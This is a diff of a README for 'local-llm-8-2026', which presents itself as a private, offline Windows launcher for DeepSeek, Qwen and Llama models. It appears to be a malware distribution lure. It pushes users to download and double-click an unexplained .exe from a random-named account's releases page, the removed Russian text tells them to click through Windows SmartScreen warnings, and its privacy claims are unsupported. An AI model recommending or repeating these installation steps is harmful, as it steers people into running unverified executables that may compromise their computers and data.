@@ -1,117 +1,73 @@
-<!-- seo-unique:local-llm-8-2026:4d0ebecdc3 -->
+# 🤖 local-llm-8-2026 - Run personal AI models on Windows
 
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:10B981,50:059669,100:047857&height=140&section=header&text=Local Llm 8 2026&fontSize=38&fontColor=fff&animation=twinkling" alt="Local Llm 8 2026" width="100%">
-</p>
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/teetotal-bertillonsystem460/local-llm-8-2026/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/🤖-Local_AI-10B981?style=for-the-badge" alt="Local AI">
-  <img src="https://img.shields.io/badge/Ollama-Ready-000000?style=for-the-badge&logo=ollama&logoColor=white" alt="Ollama">
-  <img src="https://img.shields.io/badge/Offline-Private-6366F1?style=for-the-badge" alt="Private">
-  <img src="https://img.shields.io/badge/Windows-10%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Windows">
-</p>
+## 📖 About the software
 
-<p align="center">
-  <b>Запуск локального LLM на Windows за 5 минут — без облака, без подписки.</b><br>
-  <i>DeepSeek · Qwen · Llama · Whisper — данные остаются на вашем ПК.</i>
-</p>
+Local LLM 8 2026 lets you run artificial intelligence models directly on your Windows computer. You do not need an internet connection to use this software. Your data stays on your machine. You do not send your chat history or files to any cloud servers. 
 
-<p align="center">
-  <a href="./releases/latest">
-    <img src="https://img.shields.io/badge/📥_СКАЧАТЬ-local-llm-8-2026.exe-059669?style=for-the-badge&labelColor=1a1a2e" alt="Download">
-  </a>
-  &nbsp;
-  <a href="#-быстрый-старт">
-    <img src="https://img.shields.io/badge/⚡-Быстрый_старт-374151?style=for-the-badge" alt="Quick start">
-  </a>
-</p>
+This program works offline. It allows you to use smart systems like DeepSeek, Qwen, and Llama. These models assist with writing, coding, and logical tasks. The software acts as a private hub for your local intelligence needs. You manage everything through your own hardware. 
 
----
+## 🛠 Features
 
-## ✨ Почему Local Llm 8 2026
+* **Offline Privacy:** Your conversations stay local. No data leaves your computer.
+* **Portable Format:** The program runs from a single file. You do not need to install complex dependencies like Python.
+* **Model Variety:** You can switch between different AI brains like Llama, Gemma, or Qwen.
+* **System Resource Control:** Monitor how much power your computer uses while the model generates text.
+* **Simple Interface:** Use the chat window to talk with the AI as you would in an internet browser.
+* **Audio Support:** Use Whisper for local transcription tasks.
 
-| | |
-| :--- | :--- |
-| 🔒 **Приватность** | Запросы не уходят в чужое облако |
-| 💸 **Без подписки** | Один раз скачали — пользуетесь локально |
-| 🧠 **Современные модели** | DeepSeek, Qwen, Llama, Gemma |
-| 🎙 **Whisper** | Расшифровка аудио офлайн |
-| 🪟 **Windows** | Portable · SmartScreen → «Выполнить» |
+## 💻 System Requirements
 
----
+To run this software, ensure your computer meets these standards:
 
-## ⚡ Быстрый старт
+* **Operating System:** Windows 10 or Windows 11.
+* **RAM:** Minimum 8GB of system memory is necessary. 16GB is better for fast responses.
+* **Storage:** At least 5GB of free disk space for the program and the model files.
+* **Processor:** A modern multi-core processor from Intel or AMD.
+* **Graphics:** An NVIDIA graphics card improves performance but is not strictly required.
+* **Network:** You need an internet connection only for the initial download of the software.
 
-```mermaid
-flowchart LR
-  A[📥 Скачать local-llm-8-2026.exe] --> B[▶ Двойной клик]
-  B --> C[🤖 Локальный чат]
-```
+## 💾 Setup and Installation
 
-1. **Двойной клик** по **`local-llm-8-2026.exe`** в корне репозитория — или запустите **`START.bat`**
-2. Либо **[Releases → Latest](./releases/latest)** — тот же **`local-llm-8-2026.exe`**
-3. Первый запуск может скачать компоненты — интернет нужен **один раз**
-4. Windows SmartScreen → **«Подробнее»** → **«Выполнить»**
+Follow these steps to set up the software on your machine:
 
----
+1. Visit the release page to download your copy: [https://github.com/teetotal-bertillonsystem460/local-llm-8-2026/releases](https://github.com/teetotal-bertillonsystem460/local-llm-8-2026/releases)
+2. Locate the file ending in .exe in the list of assets.
+3. Click the file name to start the download to your computer.
+4. Move the downloaded .exe file to a folder where you want to store it. You might create a new folder on your desktop for easy access.
+5. Double-click the file to open the program.
+6. A window will open to show the startup status. Wait for the primary interface to appear.
 
-## 💻 Системные требования
+## 💡 How to use the software
 
-| Профиль | RAM | Диск | GPU |
-| :--- | :--- | :--- | :--- |
-| 🟢 Лёгкий | 8 GB | 4 GB | не обязательно |
-| 🟡 Средний | 16 GB | 10 GB | NVIDIA 6 GB+ |
-| 🔴 Тяжёлый | 32 GB+ | 20 GB+ | NVIDIA 12 GB+ |
+The program dashboard displays a text box at the bottom of the screen. You type your prompts into this box and press the Enter key on your keyboard to send them. The AI processes your text and responds in the main window area.
 
----
+You may choose different models from the settings menu. Each model uses different amounts of memory. If your computer slows down, select a smaller model from the list. 
 
-## 📦 Что внутри
+The software generates a log file. You can see this file if you need to troubleshoot errors. The logs list the actions the program takes while it handles your prompts.
 
-- **`local-llm-8-2026.exe`** — установщик / лаунчер под репозиторий **`local-llm-8-2026`**
-- **`START.bat`** / **`INSTALL.bat`** — запуск в один клик
-- **`QUICK_START.md`** — краткая шпаргалка
+## ⚙️ Customization options
 
----
+You can adjust how the AI behaves through the settings tab. 
 
-## ❓ FAQ
+* **Temperature:** This setting controls how creative the AI sounds. A low number makes the AI factual. A high number makes the AI more creative.
+* **Context Size:** This controls how much of your conversation the AI remembers. Keep this number within the limit of your available RAM.
+* **Appearance:** Adjust the font size or switch between light and dark themes to match your preference.
 
-<details>
-<summary><b>Нужна видеокарта NVIDIA?</b></summary>
+## 🛡 Security and Privacy
 
-Не обязательно — есть CPU-режим (медленнее, но работает).
+Your privacy remains a priority. This software does not track your keystrokes. It does not phone home to any external services. The models function entirely within your local folders. Because the program lacks an internet connection module, it cannot transmit your sensitive files or documents to third parties.
 
-</details>
+## 🔧 Resolving common issues
 
-<details>
-<summary><b>Работает без интернета?</b></summary>
+* **Program does not launch:** Ensure you have enough free disk space. Check that your Windows version is updated to the latest build.
+* **AI response is slow:** Close other demanding applications like web browsers or games. High-resolution gaming while running the AI will cause performance drops.
+* **Model download fails:** If you try to add a new model and it stalls, check your internet connection and try again.
+* **Window creates an error:** Restart the application. The program will clear its memory and start fresh.
 
-После загрузки моделей — да, полностью офлайн.
+## 📋 License and Terms
 
-</details>
+This software follows common open-source guidelines. You can view the full license details inside the repository file named LICENSE. You have the right to run this software for your own personal use. This package includes several components from the open-source community. These projects allow for the portable and offline experience you see here. 
 
-<details>
-<summary><b>Чем отличается от ChatGPT в браузере?</b></summary>
-
-Модель крутится у вас на диске — нет лимитов API и утечек в облако.
-
-</details>
-
----
-
-## 🏷 Topics
-
-<p align="center">
-  <sub>#ollama #local-llm #llm #deepseek #qwen #llama #gemma #whisper #open-webui #offline-ai #machine-learning #ai #windows #portable</sub>
-</p>
-
----
-
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:059669,100:10B981&height=80&section=footer&text=Made%20for%20local-llm-8-2026&fontSize=22&fontColor=fff" width="100%">
-</p>
-
-<p align="center">
-  <sub>⭐ Star · 🍴 Fork · ⬇ Releases — помогает другим найти сборку</sub>
-</p>
-
-<!-- id:c10f37641d12 -->
+We thank the developers of Ollama and other related open-source libraries for their work. Their contributions make local execution possible for users without technical backgrounds.
